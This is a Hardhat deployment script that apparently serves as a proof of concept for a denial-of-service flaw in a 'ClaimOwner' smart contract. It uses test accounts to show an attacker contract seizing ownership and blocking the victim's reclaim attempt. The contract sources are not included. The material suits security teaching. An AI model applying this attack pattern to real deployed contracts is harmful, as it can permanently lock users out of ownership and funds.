const { ethers } = require("hardhat");

async function main() {
  // Deploy the ClaimOwner contract
  const ClaimOwner = await ethers.getContractFactory("ClaimOwner");
  const claimOwner = await ClaimOwner.deploy();
  await claimOwner.waitForDeployment();
  // console.log("ClaimOwner deployed at:", claimOwner.address);

  // Deploy the DenialOfService contract
  const DenialOfService = await ethers.getContractFactory("DenialOfService");
  const denialOfService = await DenialOfService.deploy(claimOwner.target);
  await denialOfService.waitForDeployment();
  // console.log("DenialOfService deployed at:", denialOfService.address);

  const [deployer, attacker, victim] = await ethers.getSigners();

  // Victim tries to claim ownership
  const victimClaimAmount = ethers.parseEther("2"); // 2 ETH
  await claimOwner.connect(victim).claimOwner({ value: victimClaimAmount });
  console.log("Victim successfully claimed ownership");

  // Attacker executes the attack
  const attackAmount = ethers.parseEther("3"); // 3 ETH
  console.log("Executing attack...");
  await denialOfService.connect(attacker).attack({ value: attackAmount });

  // Check the state after the attack
  const newOwner = await claimOwner.currentOwner();
  const newBalance = await claimOwner.currentBal();

  console.log("New owner of ClaimOwner:", newOwner);
  console.log("New balance in ClaimOwner:", ethers.formatEther(newBalance));
  if (newOwner.toLowerCase() === (await denialOfService.getAddress()).toLowerCase()) {
    console.log("Attack successful! The attacker contract is now the owner and has caused a DoS.");
  } else {
    console.log("Attack failed.");
  }

  // Try to recover the contract
  try {
    const recoveryAmount = ethers.parseEther("4"); // 4 ETH
    await claimOwner.connect(victim).claimOwner({ value: recoveryAmount });
    console.log("Victim successfully reclaimed ownership");
  } catch (error) {
    console.error("Reclaim attempt failed due to DoS:", error.message);
  }
}

// Run the script
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("Error:", error);
    process.exit(1);
  });
